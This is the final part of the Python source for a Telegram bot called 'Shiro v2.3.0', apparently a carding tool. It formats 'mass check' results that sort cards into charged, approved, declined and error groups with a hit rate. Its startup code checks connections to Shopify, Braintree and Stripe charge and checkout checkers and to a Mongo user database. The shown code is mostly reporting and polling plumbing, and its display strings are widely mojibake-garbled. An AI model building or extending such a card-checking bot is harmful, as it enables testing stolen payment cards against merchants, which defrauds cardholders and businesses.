            file_lines.append("  Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬")
        file_lines.append("")
    if declined_cards:
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        file_lines.append("           Ã¢ÂÅ’  DECLINED")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in declined_cards:
            parts = c.split(" | ")
            file_lines.append(f"  Ã¢â€Å“ Card      Ã‚Â·  {parts[0]}")
            file_lines.append(f"  Ã¢â€â€ Response  Ã‚Â·  {parts[1] if len(parts) > 1 else 'N/A'}")
            file_lines.append("  Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬")
        file_lines.append("")
    if error_cards:
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        file_lines.append("           Ã¢Å¡Â Ã¯Â¸Â  ERRORS")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in error_cards:
            parts = c.split(" | ")
            file_lines.append(f"  Ã¢â€Å“ Card      Ã‚Â·  {parts[0]}")
            file_lines.append(f"  Ã¢â€â€ Error     Ã‚Â·  {parts[1] if len(parts) > 1 else 'N/A'}")
            file_lines.append("  Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬")
        file_lines.append("")
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
    file_lines.append("        Powered by Shiro Ã¢Å¡Â¡")
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")

    file_content = "\n".join(file_lines)
    f_buf = io.BytesIO(file_content.encode("utf-8"))
    f_buf.name = f"shiro_mass_{total}cards.txt"
    try:
        sc = _to_bold_sans
        _cap  = f"Ã¢Å¡Â¡ <b>{sc('MASS CHECK RESULTS')}</b>\n"
        _cap += f"Ã°Å¸â€™Å½ <b>{charged}</b>  Ã¢Å“â€¦ <b>{approved}</b>  Ã¢ÂÅ’ {declined}  Ã¢Å¡Â Ã¯Â¸Â {errors}  Ã‚Â·  Ã°Å¸Å½Â¯ {f_hit_rate:.1f}%  Ã‚Â·  Ã¢ÂÂ± {f_time}"
        bot.send_document(cid, f_buf, caption=_cap, parse_mode="HTML")
    except Exception:
        pass


def main():
    # Ã¢â€â‚¬Ã¢â€â‚¬ Startup Logging Ã¢â€â‚¬Ã¢â€â‚¬
    log.info('Bot', f'Starting Shiro v2.3.0 (Token: {BOT_TOKEN[:15]}...)')
    
    # Log uvloop status
    if _uvloop_loaded:
        log.success('Event Loop', 'uvloop loaded - faster async I/O')
    else:
        log.warning('Event Loop', 'uvloop not installed - using default asyncio')
    
    # Check API connections
    try:
        run_shopify_check
        log.success('API', 'Shopify API connected')
    except NameError as e:
        log.error('API', f'Shopify API not connected: {e}')
    
    if _HAS_BT:
        log.success('API', 'Braintree API connected')
    else:
        log.warning('API', 'Braintree API not installed')
    
    try:
        try_checkout_card
        log.success('API', 'Stripe AC API connected')
    except NameError:
        log.warning('API', 'Stripe AC API not connected')
    
    if _HAS_ST:
        log.success('API', 'Stripe Charge API connected')
    else:
        log.warning('API', 'Stripe Charge API not connected')
    
    if OWNER_IDS:
        log.info('Admin', f'Owner IDs: {OWNER_IDS}')
    
    # Database connection
    db, coll = _get_mongo()
    if coll is not None:
        log.info('Mongo', 'Syncing database...')
        sync_result = sync_database()
        if sync_result["success"]:
            log.success('Mongo', f'Connected - {sync_result["total_users"]} users, {sync_result["total_chats"]} chats')
            if sync_result['users_synced'] > 0 or sync_result['chats_synced'] > 0:
                log.info('Mongo', f'Updated: {sync_result["users_synced"]} users, {sync_result["chats_synced"]} chats')
            if sync_result.get('invalid_users', 0) > 0:
                log.warning('Mongo', f'Skipped {sync_result["invalid_users"]} invalid user IDs')
        else:
            log.warning('Mongo', f'Sync warning: {sync_result.get("error", "Unknown")}')
    else:
        log.warning('Mongo', 'Not connected - in-memory mode only')
    
    # Ã¢â€â‚¬Ã¢â€â‚¬ Graceful shutdown handler Ã¢â€â‚¬Ã¢â€â‚¬
    _shutdown_event = threading.Event()

    def _graceful_shutdown(signum, frame):
        sig_name = signal.Signals(signum).name if hasattr(signal, 'Signals') else str(signum)
        log.warning('Shutdown', f'Received {sig_name}, shutting down gracefully...')
        _shutdown_event.set()
        try:
            bot.stop_polling()
        except Exception:
            pass
        # Close aiohttp session
        try:
            if _aio_session and not _aio_session.closed:
                asyncio.run_coroutine_threadsafe(_aio_session.close(), _shared_loop).result(timeout=3)
        except Exception:
            pass
        # Shutdown background pool
        try:
            _bg_pool.shutdown(wait=False)
        except Exception:
            pass
        # Shutdown mass-check pool
        try:
            _mass_pool.shutdown(wait=False)
        except Exception:
            pass
        log.success('Shutdown', 'Cleanup complete')
        sys.exit(0)

    signal.signal(signal.SIGINT, _graceful_shutdown)
    signal.signal(signal.SIGTERM, _graceful_shutdown)

    # Optimized polling with error recovery + crash resilience
    while not _shutdown_event.is_set():
        try:
            log.success('Bot', 'Polling started - ready for commands')
            bot.infinity_polling(
                timeout=30,              # HTTP long-poll timeout
                long_polling_timeout=25, # Telegram long-poll (must be < timeout)
                skip_pending=True,       # Skip old updates
                allowed_updates=["message", "callback_query"],
                restart_on_change=False,
                none_stop=True,          # Never stop on errors
                logger_level=None,       # Reduce log noise under heavy load
            )
        except KeyboardInterrupt:
            log.warning('Shutdown', 'KeyboardInterrupt received')
            break
        except Exception as e:
            log.error('Crash', f'Polling crashed: {type(e).__name__}: {e}')
            traceback.print_exc()
            if not _shutdown_event.is_set():
                log.warning('Crash', 'Restarting polling in 3 seconds...')
                time.sleep(3)
                continue
            break

    # Final cleanup
    try:
        if _aio_session and not _aio_session.closed:
            asyncio.run_coroutine_threadsafe(_aio_session.close(), _shared_loop).result(timeout=3)
    except Exception:
        pass
    log.success('Shutdown', 'Bot stopped')


if __name__ == "__main__":
    main()
